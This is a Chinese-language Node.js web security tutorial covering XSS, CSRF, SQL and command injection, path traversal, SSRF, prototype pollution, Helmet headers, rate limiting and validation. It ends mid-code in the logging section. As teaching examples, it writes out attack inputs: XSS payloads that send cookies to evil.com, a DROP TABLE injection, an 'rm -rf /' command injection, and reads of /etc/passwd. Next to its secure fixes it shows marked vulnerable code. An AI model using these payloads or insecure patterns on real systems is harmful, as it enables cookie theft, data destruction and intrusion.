---
title: Web安全概述
description: Node.js 作为服务端开发平台，在构建 Web 应用时面临着各种安全威胁。了解这些威胁并采取相应的防护措施，是保障应用安全的基础。
keywords: [Node.js, 安全认证, Web]
category: Node.js
tags: [Node.js, 安全认证]
---
# Web安全概述







## Web 安全概述

Node.js 作为服务端开发平台，在构建 Web 应用时面临着各种安全威胁。了解这些威胁并采取相应的防护措施，是保障应用安全的基础。

### 安全架构概述

#### 防护层次体系

Web 安全防护采用多层防御策略，从网络层到应用层逐级保护：

```
┌─────────────────────────────────────────────────────────────┐
│                        客户端层                              │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │ 输入验证    │  │ HTTPS 通信  │  │ 安全 Cookie │         │
│  └─────────────┘  └─────────────┘  └─────────────┘         │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│                        网络层                                │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │ DDoS 防护   │  │ WAF 防火墙  │  │ SSL/TLS    │         │
│  └─────────────┘  └─────────────┘  └─────────────┘         │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│                      应用层                                  │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │ 身份认证    │  │ 权限控制    │  │ 输入过滤    │         │
│  └─────────────┘  └─────────────┘  └─────────────┘         │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │ CSRF 防护   │  │ XSS 防护    │  │ SQL 注入防护│         │
│  └─────────────┘  └─────────────┘  └─────────────┘         │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│                      数据层                                  │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │ 数据加密    │  │ 访问控制    │  │ 备份恢复    │         │
│  └─────────────┘  └─────────────┘  └─────────────┘         │
└─────────────────────────────────────────────────────────────┘
```

#### 安全请求处理流程

```
客户端请求
    ↓
[HTTPS 加密传输]
    ↓
[速率限制检查] ──→ 超限 → 返回 429 错误
    ↓
[身份认证验证] ──→ 失败 → 返回 401 错误
    ↓
[权限授权检查] ──→ 失败 → 返回 403 错误
    ↓
[输入验证过滤] ──→ 无效 → 返回 400 错误
    ↓
[CSRF Token 验证] ──→ 失败 → 返回 403 错误
    ↓
[业务逻辑处理]
    ↓
[输出编码转义]
    ↓
[安全响应头设置]
    ↓
返回响应
```

### 常见 Web 安全威胁

#### 1. XSS（跨站脚本攻击）

XSS（Cross-Site Scripting）是最常见的 Web 安全漏洞之一。攻击者通过在网页中注入恶意脚本，窃取用户的敏感信息或执行恶意操作。

**攻击类型：**

| 类型 | 触发方式 | 危害程度 | 持久性 |
|------|---------|---------|--------|
| 反射型 XSS | URL 参数传递到响应页面 | 中等 | 临时 |
| 存储型 XSS | 恶意脚本存储在数据库 | 高 | 持久 |
| DOM 型 XSS | 前端 JavaScript 动态执行 | 中等 | 临时 |

**攻击示例：**

```html
<!-- 攻击者输入 -->
<script>
  fetch('http://evil.com?cookie=' + document.cookie)
</script>

<!-- 图片标签注入 -->
<img src=x onerror="fetch('http://evil.com?cookie=' + document.cookie)">

<!-- 事件处理器注入 -->
<div onmouseover="alert('XSS')">悬停查看</div>
```

**防护措施：**

```javascript
const express = require('express')
const helmet = require('helmet')
const { body, validationResult } = require('express-validator')

const app = express()

// 1. 内容安全策略 (CSP)
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "https://trusted.cdn.com"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"]
  }
}))

// 2. X-XSS-Protection 头已被浏览器废弃（Helmet 7 起已移除 xssFilter 中间件），
//    如需兼容旧浏览器可手动发送 X-XSS-Protection: 0；真正的 XSS 防线是上面的 CSP
app.use((req, res, next) => {
  res.setHeader('X-XSS-Protection', '0')
  next()
})

// 3. 输入验证中间件
const sanitizeInput = [
  body('username').trim().escape(),
  body('email').isEmail().normalizeEmail(),
  body('content').trim().escape()
]

app.post('/comment', sanitizeInput, (req, res) => {
  const errors = validationResult(req)
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() })
  }
  // 处理验证后的数据
  res.json({ success: true })
})

// 4. 自定义转义函数
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;")
}

// 5. 使用模板引擎自动转义（如 EJS）
// <%= %> 自动转义，<%- %> 不转义（谨慎使用）
app.set('view engine', 'ejs')
```

**前端防护补充：**

```jsx
// React 自动转义
function SafeComponent({ userInput }) {
  return <div>{userInput}</div> // 自动转义
}
```

```html
<!-- Vue 自动转义 -->
<template>
  <div>{{ userInput }}</div> <!-- 自动转义 -->
</template>
```

```jsx
// 使用 DOMPurify 清理 HTML
import DOMPurify from 'dompurify'

function SafeHTML({ html }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  })
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}
```

#### 2. CSRF（跨站请求伪造）

CSRF（Cross-Site Request Forgery）攻击者诱导用户在已登录的网站上执行非预期的操作。

**攻击流程图：**

```
┌──────────┐                    ┌──────────┐                    ┌──────────┐
│  用户    │                    │ 恶意网站 │                    │ 目标网站 │
└────┬─────┘                    └────┬─────┘                    └────┬─────┘
     │                               │                               │
     │  1. 用户登录目标网站           │                               │
     │──────────────────────────────────────────────────────────────>│
     │                               │                               │
     │  2. 获取有效 Cookie            │                               │
     │<──────────────────────────────────────────────────────────────│
     │                               │                               │
     │  3. 访问恶意网站               │                               │
     │──────────────────────────────>│                               │
     │                               │                               │
     │  4. 恶意网站自动发送请求       │                               │
     │                               │  5. 携带用户 Cookie 发送请求   │
     │                               │──────────────────────────────>│
     │                               │                               │
     │                               │  6. 服务器误认为合法请求       │
     │                               │<──────────────────────────────│
     │                               │                               │
```

**防护措施：**

> 注：`csurf` 包已停止维护（deprecated），下例保留其配置思路供参考；生产环境更推荐文中的 SameSite Cookie、Origin/Referer 校验方案，或自行实现 Token 校验中间件。

```javascript
const express = require('express')
const csrf = require('csurf')
const cookieParser = require('cookie-parser')

const app = express()
app.use(cookieParser())

// CSRF Token 配置
const csrfProtection = csrf({
  cookie: {
    key: '_csrf',           // Cookie 名称
    httpOnly: true,         // 防止 JavaScript 访问
    secure: true,           // 仅 HTTPS 传输
    sameSite: 'strict',     // 严格的同站策略
    maxAge: 3600            // 有效期（秒）
  }
})

// API 路由 CSRF 保护
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() })
})

app.post('/api/transfer', csrfProtection, (req, res) => {
  // CSRF 验证通过后执行操作
  res.json({ success: true, message: '转账成功' })
})

// SameSite Cookie 配置
app.use((req, res, next) => {
  res.cookie('sessionId', 'xxx', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict' // 或 'lax'
  })
  next()
})

// 检查 Origin/Referer 头
app.use((req, res, next) => {
  const allowedOrigins = ['https://yourdomain.com', 'https://www.yourdomain.com']
  const origin = req.get('Origin') || req.get('Referer')
  
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    if (!origin || !allowedOrigins.some(allowed => origin.startsWith(allowed))) {
      return res.status(403).json({ error: 'CSRF 防护：非法来源' })
    }
  }
  next()
})
```

**前端 CSRF Token 处理：**

```javascript
// 获取 CSRF Token
async function getCsrfToken() {
  const response = await fetch('/api/csrf-token', {
    credentials: 'include'
  })
  const data = await response.json()
  return data.csrfToken
}

// 发送请求时携带 Token
async function submitForm(data) {
  const csrfToken = await getCsrfToken()
  
  const response = await fetch('/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    credentials: 'include',
    body: JSON.stringify(data)
  })
  
  return response.json()
}
```

#### 3. SQL 注入

攻击者通过构造恶意的 SQL 语句，获取、修改或删除数据库中的数据。

**攻击类型：**

| 类型 | 描述 | 示例 |
|------|------|------|
| 联合查询注入 | 使用 UNION 合并查询结果 | `1 UNION SELECT * FROM users` |
| 布尔盲注 | 通过真假条件判断数据 | `1 AND 1=1` / `1 AND 1=2` |
| 时间盲注 | 通过延迟判断条件 | `1 AND SLEEP(5)` |
| 报错注入 | 利用错误信息获取数据 | `1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))` |

**危险示例：**

```javascript
// ❌ 不安全：直接拼接 SQL
app.get('/user', (req, res) => {
  const userId = req.query.id
  const sql = `SELECT * FROM users WHERE id = ${userId}`
  // 攻击者输入: id = "1 OR 1=1"
  // 实际执行: SELECT * FROM users WHERE id = 1 OR 1=1
  // 结果: 返回所有用户数据
})

// ❌ 不安全：使用字符串拼接
app.get('/search', (req, res) => {
  const keyword = req.query.q
  const sql = `SELECT * FROM products WHERE name LIKE '%${keyword}%'`
  // 攻击者输入: q = "'; DROP TABLE products; --"
  // 实际执行: SELECT * FROM products WHERE name LIKE '%'; DROP TABLE products; --%'
})
```

**安全做法：**

```javascript
const mysql = require('mysql2/promise')
const { Sequelize } = require('sequelize')

// ==================== 参数化查询 ====================

// 创建连接池
const pool = mysql.createPool({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME,
  waitForConnections: true,
  connectionLimit: 10
})

// 使用参数化查询
app.get('/user', async (req, res) => {
  try {
    const userId = req.query.id
    // 参数化查询自动转义
    const [rows] = await pool.execute(
      'SELECT id, username, email FROM users WHERE id = ?',
      [userId]
    )
    res.json(rows)
  } catch (error) {
    console.error(error)
    res.status(500).json({ error: '服务器错误' })
  }
})

// LIKE 查询的安全写法
app.get('/search', async (req, res) => {
  const keyword = req.query.q
  const [rows] = await pool.execute(
    'SELECT * FROM products WHERE name LIKE ?',
    [`%${keyword}%`]
  )
  res.json(rows)
})

// ==================== ORM 框架 ====================

// Sequelize 配置
const sequelize = new Sequelize(process.env.DATABASE_URL, {
  dialect: 'mysql',
  logging: false
})

// 定义模型
const User = sequelize.define('User', {
  username: { type: Sequelize.STRING },
  email: { type: Sequelize.STRING }
})

// 安全查询
app.get('/users/:id', async (req, res) => {
  const user = await User.findOne({
    where: { id: req.params.id },
    attributes: ['id', 'username', 'email'] // 排除敏感字段
  })
  res.json(user)
})

// ==================== 输入验证 ====================

const Joi = require('joi')

const userIdSchema = Joi.object({
  id: Joi.number().integer().positive().required()
})

app.get('/user/:id', async (req, res) => {
  const { error, value } = userIdSchema.validate(req.params)
  
  if (error) {
    return res.status(400).json({ error: '无效的用户 ID' })
  }
  
  const user = await User.findByPk(value.id)
  res.json(user)
})
```

#### 4. 命令注入

攻击者通过注入系统命令，在服务器上执行任意命令。

**危险示例：**

```javascript
// ❌ 不安全：直接执行用户输入
const { exec } = require('child_process')

app.get('/ping', (req, res) => {
  const host = req.query.host
  exec(`ping -c 4 ${host}`, (error, stdout, stderr) => {
    res.send(stdout)
  })
  // 攻击者输入: host = "google.com; rm -rf /"
  // 实际执行: ping -c 4 google.com; rm -rf /
})

// ❌ 不安全：文件操作
app.get('/read', (req, res) => {
  const filename = req.query.file
  exec(`cat ${filename}`, (error, stdout, stderr) => {
    res.send(stdout)
  })
  // 攻击者输入: file = "/etc/passwd"
})
```

**安全做法：**

```javascript
const { execFile, spawn } = require('child_process')
const validator = require('validator')

// ==================== 使用 execFile ====================

app.get('/ping', (req, res) => {
  const host = validator.trim(req.query.host || '')
  
  // 白名单验证
  if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
    return res.status(400).json({ error: '无效的主机名' })
  }
  
  // 长度限制
  if (host.length > 253) {
    return res.status(400).json({ error: '主机名过长' })
  }
  
  // 使用 execFile 避免通过 shell 执行
  execFile('ping', ['-c', '4', host], {
    timeout: 10000,        // 超时限制
    maxBuffer: 1024 * 1024 // 输出缓冲区限制
  }, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).json({ error: '命令执行失败' })
    }
    res.send(stdout)
  })
})

// ==================== 使用 spawn（流式处理）====================

app.get('/dig', (req, res) => {
  const domain = validator.trim(req.query.domain || '')
  
  if (!/^[a-zA-Z0-9.-]+$/.test(domain)) {
    return res.status(400).json({ error: '无效的域名' })
  }
  
  const child = spawn('dig', [domain], {
    timeout: 10000
  })
  
  res.setHeader('Content-Type', 'text/plain')
  child.stdout.pipe(res)
  
  child.on('error', (error) => {
    res.status(500).json({ error: '命令执行失败' })
  })
})

// ==================== 使用允许列表 ====================

const ALLOWED_COMMANDS = {
  ping: { binary: 'ping', args: ['-c', '4'] },
  dig: { binary: 'dig', args: [] }
}

app.get('/network/:command', (req, res) => {
  const { command } = req.params
  const target = req.query.target
  
  // 检查命令是否在允许列表中
  if (!ALLOWED_COMMANDS[command]) {
    return res.status(400).json({ error: '不允许执行的命令' })
  }
  
  // 验证目标参数
  if (!/^[a-zA-Z0-9.-]+$/.test(target)) {
    return res.status(400).json({ error: '无效的目标' })
  }
  
  const { binary, args } = ALLOWED_COMMANDS[command]
  execFile(binary, [...args, target], (error, stdout) => {
    if (error) {
      return res.status(500).json({ error: '执行失败' })
    }
    res.send(stdout)
  })
})
```

#### 5. 路径遍历

攻击者通过构造特殊路径，访问服务器上的敏感文件。

**危险示例：**

```javascript
// ❌ 不安全：直接使用用户输入的文件路径
app.get('/download', (req, res) => {
  const filename = req.query.file
  res.sendFile(`/uploads/${filename}`)
  // 攻击者输入: file = "../../etc/passwd"
  // 实际路径: /uploads/../../etc/passwd → /etc/passwd
})

// ❌ 不安全：文件读取
app.get('/read', (req, res) => {
  const filepath = req.query.path
  const content = fs.readFileSync(filepath, 'utf8')
  res.send(content)
})
```

**安全做法：**

```javascript
const path = require('path')
const fs = require('fs').promises

// 配置允许的目录
const UPLOADS_DIR = path.resolve('/var/www/uploads')
const ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.pdf', '.txt']

// ==================== 文件下载 ====================

app.get('/download', async (req, res) => {
  try {
    // 只使用文件名，忽略路径部分
    const filename = path.basename(req.query.file)
    
    // 构建完整路径
    const filePath = path.join(UPLOADS_DIR, filename)
    
    // 解析为绝对路径
    const resolvedPath = path.resolve(filePath)
    
    // 验证文件路径是否在允许的目录内
    if (!resolvedPath.startsWith(UPLOADS_DIR + path.sep)) {
      return res.status(403).json({ error: '非法路径' })
    }
    
    // 验证文件扩展名
    const ext = path.extname(resolvedPath).toLowerCase()
    if (!ALLOWED_EXTENSIONS.includes(ext)) {
      return res.status(403).json({ error: '不支持的文件类型' })
    }
    
    // 检查文件是否存在
    try {
      await fs.access(resolvedPath)
    } catch {
      return res.status(404).json({ error: '文件不存在' })
    }
    
    // 设置安全响应头
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`)
    res.setHeader('X-Content-Type-Options', 'nosniff')
    
    res.sendFile(resolvedPath)
  } catch (error) {
    console.error(error)
    res.status(500).json({ error: '服务器错误' })
  }
})

// ==================== 静态文件服务 ====================

app.use('/static', express.static(UPLOADS_DIR, {
  // 禁止目录浏览
  index: false,
  // 设置缓存
  maxAge: '1d',
  // 安全响应头
  setHeaders: (res) => {
    res.setHeader('X-Content-Type-Options', 'nosniff')
  }
}))

// ==================== 文件上传 ====================

const multer = require('multer')

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, UPLOADS_DIR)
  },
  filename: (req, file, cb) => {
    // 生成安全的文件名
    const ext = path.extname(file.originalname).toLowerCase()
    const safeName = `${Date.now()}-${Math.random().toString(36).slice(2)}${ext}`
    cb(null, safeName)
  }
})

const upload = multer({
  storage,
  limits: {
    fileSize: 10 * 1024 * 1024, // 10MB
    files: 5
  },
  fileFilter: (req, file, cb) => {
    const ext = path.extname(file.originalname).toLowerCase()
    if (!ALLOWED_EXTENSIONS.includes(ext)) {
      return cb(new Error('不支持的文件类型'), false)
    }
    
    // 验证 MIME 类型
    const allowedMimes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf', 'text/plain']
    if (!allowedMimes.includes(file.mimetype)) {
      return cb(new Error('不允许的 MIME 类型'), false)
    }
    
    cb(null, true)
  }
})

app.post('/upload', upload.single('file'), (req, res) => {
  res.json({ success: true, filename: req.file.filename })
})
```

#### 6. 其他常见攻击

**XXE（XML 外部实体注入）：**

```javascript
// ❌ 不安全：解析外部实体
const libxmljs = require('libxmljs')

app.post('/parse-xml', (req, res) => {
  const doc = libxmljs.parseXml(req.body.xml, {
    noent: true,    // 危险：启用外部实体
    dtdload: true   // 危险：加载外部 DTD
  })
  res.send(doc.toString())
})

// ✅ 安全：禁用外部实体
app.post('/parse-xml', (req, res) => {
  const doc = libxmljs.parseXml(req.body.xml, {
    noent: false,
    dtdload: false,
    dtdattr: false,
    nonet: true
  })
  res.send(doc.toString())
})

// ✅ 推荐：使用 JSON 替代 XML
app.post('/parse', express.json(), (req, res) => {
  const data = req.body
  res.json(data)
})
```

**SSRF（服务端请求伪造）：**

```javascript
const axios = require('axios')
const { URL } = require('url')

// ❌ 不安全：直接请求用户提供的 URL
app.get('/fetch', async (req, res) => {
  const response = await axios.get(req.query.url)
  res.send(response.data)
})

// ✅ 安全：验证和限制 URL
const ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']
const PRIVATE_IPS = [
  /^10\./,
  /^172\.(1[6-9]|2[0-9]|3[0-1])\./,
  /^192\.168\./,
  /^127\./,
  /^0\.0\.0\.0$/,
  /^localhost$/i
]

async function isAllowedUrl(urlString) {
  try {
    const url = new URL(urlString)
    
    // 只允许 HTTP/HTTPS
    if (!['http:', 'https:'].includes(url.protocol)) {
      return false
    }
    
    // 检查域名白名单
    if (!ALLOWED_DOMAINS.includes(url.hostname)) {
      return false
    }
    
    // 检查是否为私有 IP（需要 DNS 解析）
    const dns = require('dns').promises
    const addresses = await dns.lookup(url.hostname, { all: true })
    
    for (const addr of addresses) {
      for (const pattern of PRIVATE_IPS) {
        if (pattern.test(addr.address)) {
          return false
        }
      }
    }
    
    return true
  } catch {
    return false
  }
}

app.get('/fetch', async (req, res) => {
  const url = req.query.url
  
  if (!await isAllowedUrl(url)) {
    return res.status(403).json({ error: '不允许访问该 URL' })
  }
  
  try {
    const response = await axios.get(url, {
      timeout: 5000,
      maxRedirects: 0, // 禁止重定向
      maxContentLength: 1024 * 1024 // 限制响应大小
    })
    res.send(response.data)
  } catch (error) {
    res.status(500).json({ error: '请求失败' })
  }
})
```

### Node.js 特有的安全问题

#### 1. ReDoS（正则表达式拒绝服务）

某些正则表达式在匹配恶意输入时会导致指数级的时间复杂度，造成服务阻塞。

```javascript
// ❌ 危险的正则表达式（包含回溯）
const emailRegex = /^([a-zA-Z0-9]+)*@([a-zA-Z0-9]+\.)+[a-zA-Z]{2,}$/
// 输入: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" 会导致长时间阻塞

// ❌ 危险的嵌套量词
const phoneRegex = /^(\d+)+$/
// 输入: "12345678901234567890!" 会导致长时间阻塞

// ✅ 使用安全的正则表达式（避免回溯）
const safeEmailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/
const safePhoneRegex = /^\d+$/

// ✅ 使用 validator 库
const validator = require('validator')

// 带超时的正则匹配
function safeRegexTest(regex, str, timeout = 1000) {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      reject(new Error('正则匹配超时'))
    }, timeout)
    
    // 使用 vm 模块隔离执行
    const vm = require('vm')
    const result = vm.runInNewContext(`/${regex.source}/${regex.flags}.test(${JSON.stringify(str)})`)
    
    clearTimeout(timer)
    resolve(result)
  })
}
```

#### 2. 不安全的反序列化

Node.js 中 `JSON.parse()` 相对安全，但某些库的反序列化可能执行任意代码。

```javascript
// ❌ 不安全：使用 node-serialize
const serialize = require('node-serialize')
const obj = serialize.unserialize(userInput)
// 恶意输入: {"__proto__":{"polluted":"yes"}}

// ❌ 不安全：使用 serialize-to-js（同样存在执行任意代码的风险）
const unserialize = require('serialize-to-js')
unserialize(userInput)

// ✅ 安全：使用 JSON.parse（只解析数据，不执行代码）
JSON.parse(userInput)

// ✅ 白名单验证
function safeUnserialize(str, allowedKeys = []) {
  const obj = JSON.parse(str)
  
  if (typeof obj !== 'object' || Array.isArray(obj)) {
    throw new Error('Invalid data type')
  }
  
  // 检查是否包含危险属性
  const dangerousKeys = ['__proto__', 'constructor', 'prototype']
  for (const key of Object.keys(obj)) {
    if (dangerousKeys.includes(key)) {
      throw new Error('Dangerous property detected')
    }
    if (allowedKeys.length > 0 && !allowedKeys.includes(key)) {
      throw new Error('Unknown property: ' + key)
    }
  }
  
  return obj
}

// 使用示例
const user = safeUnserialize(userInput, ['id', 'name', 'email'])
```

#### 3. 事件循环阻塞

CPU 密集型操作会阻塞事件循环，影响服务器响应。

```javascript
// ❌ 阻塞事件循环
function fibonacci(n) {
  if (n <= 1) return n
  return fibonacci(n - 1) + fibonacci(n - 2)
}

app.get('/calc', (req, res) => {
  const result = fibonacci(45) // 长时间阻塞
  res.send(`Result: ${result}`)
})

// ✅ 方案1：使用 Worker Threads
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads')

// fibonacci-worker.js
if (!isMainThread) {
  function fibonacci(n) {
    if (n <= 1) return n
    return fibonacci(n - 1) + fibonacci(n - 2)
  }
  parentPort.postMessage(fibonacci(workerData.n))
}

// server.js
app.get('/calc', (req, res) => {
  const worker = new Worker('./fibonacci-worker.js', {
    workerData: { n: parseInt(req.query.n) || 40 }
  })
  
  worker.on('message', result => {
    res.json({ result })
  })
  
  worker.on('error', err => {
    res.status(500).json({ error: '计算失败' })
  })
  
  worker.on('exit', code => {
    if (code !== 0) {
      res.status(500).json({ error: 'Worker 异常退出' })
    }
  })
})

// ✅ 方案2：使用子进程
const { fork } = require('child_process')

app.get('/calc', (req, res) => {
  const child = fork('./fibonacci-process.js')
  
  child.send({ n: parseInt(req.query.n) || 40 })
  child.on('message', result => {
    res.json({ result })
    child.kill()
  })
})

// ✅ 方案3：分解任务
async function fibonacciAsync(n, callback) {
  let result = 0
  const batchSize = 1000
  
  for (let i = 0; i <= n; i += batchSize) {
    await new Promise(resolve => setImmediate(resolve))
    // 执行一批计算
    // ...
  }
  
  return result
}
```

#### 4. 原型污染

```javascript
// ❌ 不安全：合并对象时可能造成原型污染
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key])
    } else {
      target[key] = source[key]
    }
  }
  return target
}

// 攻击示例
merge({}, JSON.parse('{"__proto__":{"admin":true}}'))
// 所有对象都会继承 admin: true

// ✅ 安全：使用 Object.create(null) 或检查属性
function safeMerge(target, source) {
  const result = Object.create(null)
  
  for (const key of Object.keys(source)) {
    // 跳过危险属性
    if (['__proto__', 'constructor', 'prototype'].includes(key)) {
      continue
    }
    
    if (typeof source[key] === 'object' && source[key] !== null) {
      result[key] = safeMerge({}, source[key])
    } else {
      result[key] = source[key]
    }
  }
  
  return result
}

// ✅ 使用 lodash 的 merge
const _ = require('lodash')
const result = _.merge({}, source) // lodash 已修复原型污染问题
```

### 安全防护配置详解

#### 1. HTTP 安全响应头配置

```javascript
const helmet = require('helmet')

// ==================== 完整配置示例（Helmet 7+ 选项名）====================

app.use(helmet({
  // 内容安全策略
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        "'unsafe-inline'", // 谨慎使用
        "https://cdn.jsdelivr.net"
      ],
      styleSrc: [
        "'self'",
        "'unsafe-inline'",
        "https://fonts.googleapis.com"
      ],
      imgSrc: ["'self'", "data:", "https:"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      connectSrc: ["'self'", "https://api.example.com"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
      frameAncestors: ["'none'"],
      formAction: ["'self'"],
      baseUri: ["'self'"],
      upgradeInsecureRequests: []
    },
    reportOnly: false // 设置为 true 可以只报告不阻止
  },

  // 注意：X-XSS-Protection 头已被浏览器废弃，Helmet 7 起原 xssFilter 选项更名为
  // xXssProtection（默认发送 X-XSS-Protection: 0）；XSS 防护以上方的 CSP 为准

  // 防止点击劫持（Helmet 4 的 frameguard 在 7+ 更名为 xFrameOptions）
  xFrameOptions: {
    action: 'deny' // 或 'sameorigin'
  },

  // 禁用 MIME 类型嗅探（原 noSniff，默认已开启）
  xContentTypeOptions: true,

  // X-Powered-By 头默认由 Helmet 移除（原 hidePoweredBy，现更名为 xPoweredBy），
  // 也可以改用 Express 内置的 app.disable('x-powered-by')

  // HSTS（HTTP 严格传输安全，原 hsts）
  strictTransportSecurity: {
    maxAge: 31536000,      // 1 年
    includeSubDomains: true,
    preload: true
  },

  // 禁用 DNS 预解析（原 dnsPrefetchControl）
  xDnsPrefetchControl: {
    allow: false
  },

  // Helmet 7 起不再提供 noCache 选项，需禁用缓存时手动设置 Cache-Control 头

  // 引用策略
  referrerPolicy: {
    policy: 'strict-origin-when-cross-origin'
  },

  // 跨域策略文件头（原 permittedCrossDomainPolicies，历史遗留的 Flash 策略）
  xPermittedCrossDomainPolicies: {
    permittedPolicies: 'none'
  }
}))

// ==================== 单独配置示例 ====================

// CSP 报告端点
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.log('CSP Violation:', req.body)
  res.status(204).end()
})

// 设置 CSP 报告
app.use(helmet.contentSecurityPolicy({
  directives: {
    // ... 其他指令
    reportUri: '/csp-report'
  },
  reportOnly: true // 开发环境可以先只报告
}))
```

#### 2. 速率限制配置

```javascript
const rateLimit = require('express-rate-limit')
const RedisStore = require('rate-limit-redis')
const redis = require('redis')

// Redis 客户端（用于分布式限流）
const redisClient = redis.createClient({
  url: process.env.REDIS_URL
})

// ==================== 基本限流 ====================

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 分钟
  max: 100,                 // 每个 IP 最多 100 次请求
  message: {
    error: '请求过于频繁，请稍后再试'
  },
  standardHeaders: true,    // 返回 RateLimit-* 头
  legacyHeaders: false,
  
  // 使用 Redis 存储（集群环境）
  store: new RedisStore({
    sendCommand: (...args) => redisClient.sendCommand(args)
  })
})

app.use('/api/', limiter)

// ==================== 严格限流（登录等敏感接口）====================

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 分钟
  max: 5,                   // 最多 5 次尝试
  skipSuccessfulRequests: true, // 成功的请求不计数
  message: {
    error: '登录尝试次数过多，请 15 分钟后再试'
  }
})

app.post('/login', authLimiter, loginHandler)
app.post('/register', authLimiter, registerHandler)

// ==================== 分级限流 ====================

const apiLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 分钟
  max: (req) => {
    // 根据用户等级设置不同的限制
    if (req.user?.role === 'premium') return 1000
    if (req.user?.role === 'standard') return 100
    return 20 // 未登录用户
  }
})

// ==================== 滑动窗口限流 ====================

const slidingWindowLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 100,
  standardHeaders: true,
  skip: (req) => {
    // 白名单 IP
    const whitelist = ['127.0.0.1', '::1']
    return whitelist.includes(req.ip)
  }
})
```

#### 3. 输入验证中间件

```javascript
const { body, param, query, validationResult } = require('express-validator')

// ==================== 验证结果处理 ====================

const validate = (req, res, next) => {
  const errors = validationResult(req)
  if (!errors.isEmpty()) {
    return res.status(400).json({
      error: '输入验证失败',
      details: errors.array().map(err => ({
        field: err.path,
        message: err.msg
      }))
    })
  }
  next()
}

// ==================== 用户注册验证 ====================

const registerValidation = [
  body('username')
    .trim()
    .isLength({ min: 3, max: 30 })
    .withMessage('用户名长度必须在 3-30 个字符之间')
    .isAlphanumeric()
    .withMessage('用户名只能包含字母和数字'),
  
  body('email')
    .trim()
    .normalizeEmail()
    .isEmail()
    .withMessage('请输入有效的邮箱地址'),
  
  body('password')
    .isLength({ min: 8, max: 128 })
    .withMessage('密码长度必须在 8-128 个字符之间')
    .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/)
    .withMessage('密码必须包含大小写字母和数字'),
  
  body('confirmPassword')
    .custom((value, { req }) => {
      if (value !== req.body.password) {
        throw new Error('两次输入的密码不一致')
      }
      return true
    }),
  
  validate
]

app.post('/register', registerValidation, registerHandler)

// ==================== 查询参数验证 ====================

const searchValidation = [
  query('q')
    .trim()
    .isLength({ min: 1, max: 100 })
    .withMessage('搜索关键词长度必须在 1-100 个字符之间'),
  
  query('page')
    .optional()
    .isInt({ min: 1, max: 10000 })
    .toInt()
    .withMessage('页码必须是 1-10000 之间的整数'),
  
  query('limit')
    .optional()
    .isInt({ min: 1, max: 100 })
    .toInt()
    .withMessage('每页数量必须是 1-100 之间的整数'),
  
  query('sort')
    .optional()
    .isIn(['createdAt', 'updatedAt', 'popularity'])
    .withMessage('排序字段无效'),
  
  validate
]

app.get('/search', searchValidation, searchHandler)

// ==================== 路径参数验证 ====================

const idValidation = [
  param('id')
    .isMongoId()
    .withMessage('无效的 ID 格式'),
  
  validate
]

app.get('/users/:id', idValidation, getUserHandler)
```

#### 4. 安全日志配置

```javascript
const winston = require('winston')
const { combine, timestamp, printf, json } = winston.format
const morgan = require('morgan')

// ==================== 日志配置 ====================

const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: combine(
    timestamp(),
    json()
  ),
  defaultMeta: { service: 'nodejs-app' },
  transports: [
    // 错误日志
    new winston.transports.File({
      filename: 'logs/error.log',
      level: 'error'
    }),
